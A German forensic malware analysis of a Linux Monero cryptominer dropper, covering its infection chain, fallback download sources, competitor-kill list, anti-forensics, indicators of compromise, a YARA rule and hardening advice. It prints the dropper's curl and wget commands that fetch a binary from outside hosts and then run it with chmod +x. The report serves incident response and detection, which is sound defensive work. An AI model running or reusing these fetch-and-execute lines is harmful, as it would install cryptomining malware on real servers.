# Forensische Malware-Analyse

**Datum:** 2025-12-08
**Klassifikation:** Cryptominer-Dropper / Konkurrierende Malware-Killer
**Schweregrad:** HOCH

---

## Übersicht

Dieses Skript wurde auf einem kompromittierten Server gefunden. Es handelt sich um einen automatisierten Cryptominer-Dropper, der:
- Monero-Mining-Malware installiert
- Konkurrierende Malware eliminiert
- Sich selbst nach Ausführung löscht
- Mehrere Fallback-Quellen nutzt

---

## 1. Infektionskette - Schritt für Schritt

```
┌─────────────────────────────────────────────────────────────┐
│  1. CHECK: Läuft "linuxsys" schon?                          │
│     → JA:  Aufräumen + konkurrierende Malware killen        │
│     → NEIN: Weiter zu Schritt 2                             │
├─────────────────────────────────────────────────────────────┤
│  2. DOWNLOAD (mit Fallback):                                │
│     Primär:  GitHub (whereveryouare666/linuxsys)            │
│     Backup:  Pastebin + gehackte WordPress-Seite            │
├─────────────────────────────────────────────────────────────┤
│  3. AUSFÜHREN: chmod +x linuxsys && ./linuxsys              │
├─────────────────────────────────────────────────────────────┤
│  4. SPUREN LÖSCHEN: Alles in /tmp, /dev/shm etc. weg        │
├─────────────────────────────────────────────────────────────┤
│  5. WIEDERHOLEN in 5 verschiedenen Verzeichnissen           │
└─────────────────────────────────────────────────────────────┘
```

### Phase 1: Prozessüberprüfung
```sh
p=$(ps aux | grep -E 'linuxsys|jailshell' | grep -v grep | wc -l)
```
Prüft ob bereits eine Instanz läuft.

### Phase 2: Payload-Download mit Fallback
```sh
# Primär: GitHub
curl -s https://raw.githubusercontent.com/whereveryouare666/linuxsys/refs/heads/main/config.json -o config.json
curl -s https://raw.githubusercontent.com/whereveryouare666/linuxsys/refs/heads/main/linux.bin -o linuxsys

# Fallback: Pastebin + WordPress
wget -q -O config.json https://pastebin.com/raw/5LRZX6XQ
wget -q -O linuxsys https://dodoma.shop/wp-content/uploads/2000/01/linux.bin
```

### Phase 3: Ausführung
```sh
chmod +x linuxsys; ./linuxsys
```

### Phase 4: Selbstreinigung
Löscht alle Spuren aus `/dev/shm`, `/tmp`, `/var/tmp`, `~/`

---

## 2. Command & Control (C2) Infrastruktur

| Typ | URL | Zweck |
|-----|-----|-------|
| **GitHub** | `raw.githubusercontent.com/whereveryouare666/linuxsys` | Config + Binary |
| **Pastebin** | `pastebin.com/raw/5LRZX6XQ` | Fallback-Config |
| **WordPress** | `dodoma.shop/wp-content/uploads/2000/01/linux.bin` | Fallback-Binary |

### IPs in der Kill-Liste (konkurrierende C2):
- `18.130.193.222` (AWS EU-West-2)
- `185.122.204.197` (Mining-Pool)
- `205.147.101.*`

---

## 3. Multi-Verzeichnis-Persistenz

Das Skript versucht die Infektion in **5 Verzeichnissen** nacheinander:

1. `./` (Aktuelles Verzeichnis)
2. `/dev/shm` (RAM-basiert - keine Festplatte!)
3. `/var/tmp` (Persistentes temp)
4. `/tmp` (Temporär)
5. `~/` (Home-Verzeichnis)

**Strategie:** Wenn ein Verzeichnis fehlschlägt, wird das nächste versucht.

---

## 4. Konkurrierende Malware - Kill-Liste (150+ Prozesse)

### Bekannte Cryptominer:
| Name | Beschreibung |
|------|--------------|
| `xmrig`, `xmrig_freebsd`, `xmrig_arm64` | Monero-Miner |
| `xmr-stak` | Alternativer Monero-Miner |
| `cnrig` | CryptoNight-Miner |
| `c3pool`, `moneroocean`, `supportxmr` | Pool-spezifische Miner |

### Bekannte Malware-Familien:
| Name | Familie |
|------|---------|
| `kinsing`, `kdevtmpfsi` | Kinsing (Container-fokussiert) |
| `watchbog` | Watchbog-Wurm |
| `dovecat` | Dovecat-Miner |
| `givemexyz` | TeamTNT-verbunden |

### Falsche System-Prozesse:
- `kthreaddi`, `kthreaddw`, `kthreaddo` (Fake Kernel-Threads)
- `ksoftriqd` (Fake Soft-IRQ)
- `acpid`, `clamd`, `agettyd` (Nachgeahmte Dienste)

**Warum?** CPU-Ressourcen für eigenes Mining freiräumen.

---

## 5. Anti-Forensik-Techniken

| Technik | Erklärung |
|---------|-----------|
| `/dev/shm` nutzen | RAM-basiert, nach Reboot weg |
| `curl -s` / `wget -q` | Silent-Modus, keine Logs |
| Sofortiges Löschen | Dateien werden direkt nach Ausführung gelöscht |
| `--no-check-certificate` | Umgeht SSL-Warnungen |
| `>/dev/null 2>&1` | Keine Ausgabe bei Kill-Befehlen |
| Datum `2000/01` im Pfad | Unplausibles Datum verwirrt Analysten |

---

## 6. Indicators of Compromise (IOCs)

### Dateien:
```
linuxsys
config.json
linux.sh
cron.sh
killer.sh
```

### Verzeichnisse prüfen:
```
/dev/shm/
/tmp/
/var/tmp/
~/
```

### Prozesse:
```bash
ps aux | grep -E 'linuxsys|jailshell'
```

### Netzwerk blockieren:
```
raw.githubusercontent.com/whereveryouare666/*
pastebin.com/raw/5LRZX6XQ
dodoma.shop
repositorylinux.xyz
```

### YARA-Regel:
```yara
rule LinuxCryptoMiner_Dropper {
    meta:
        description = "Detects whereveryouare666 cryptominer dropper"
        date = "2025-12-08"
    strings:
        $s1 = "whereveryouare666" ascii
        $s2 = "linuxsys" ascii
        $s3 = "jailshell" ascii
        $s4 = "dodoma.shop" ascii
        $s5 = "5LRZX6XQ" ascii
        $kill = "kinsing|kdevtmpfsi" ascii
    condition:
        2 of ($s1,$s2,$s3,$s4,$s5) or $kill
}
```

---

## 7. Payload-Delivery mit Redundanz

```
Primär: GitHub Raw Content
    │
    ▼
[Erfolg?] ──Nein──► Fallback: Pastebin/WordPress
    │
   Ja
    ▼
chmod +x && Ausführen
```

### Dual-Tool-Ansatz:
```sh
curl ... || wget ...
```
Funktioniert auch auf minimalen Systemen.

---

## 8. Interessante Beobachtungen

### GitHub als C2
- Username: `whereveryouare666`
- Vorteil: GitHub ist selten blockiert in Firewalls

### WordPress als Fallback
- `dodoma.shop` ist vermutlich eine gehackte legitime Website
- Pfad `/wp-content/uploads/2000/01/` deutet auf WordPress-Exploit

### cPanel/Jailshell-Focus
```sh
grep -E 'linuxsys|jailshell'
```
`jailshell` = cPanel Standard-Shell → Fokus auf Webhosting-Server

### Keine elegante Programmierung
- Code wiederholt sich 5x für verschiedene Verzeichnisse
- Nicht schön, aber sehr robust

---

## 9. Empfehlungen

### Sofort:
```bash
# Verzeichnisse prüfen
ls -la /dev/shm/ /tmp/ /var/tmp/

# Crontab checken
crontab -l

# Prozesse suchen
ps auxf | grep -E 'linuxsys|xmrig|mining'
```

### Netzwerk:
- GitHub-User `whereveryouare666` blockieren
- Pastebin-URL blockieren
- `dodoma.shop` blockieren

### Systemhärtung:
- `noexec` Mount für `/tmp`, `/var/tmp`, `/dev/shm`
- Outbound zu Mining-Pools blockieren
- EDR installieren

---

## Schlussfolgerung

**Professioneller Cryptominer-Dropper** mit:
- Redundanten Download-Quellen (3 Fallbacks)
- Multi-Verzeichnis-Persistenz (5 Orte)
- Aggressivem Konkurrenz-Killing (150+ Malware)
- Guter Anti-Forensik (RAM-basiert, selbstlöschend)

Die Angreifer sind erfahren und haben das Skript für **maximale Robustheit** gebaut.

---

*Analyse erstellt: 2025-12-08*
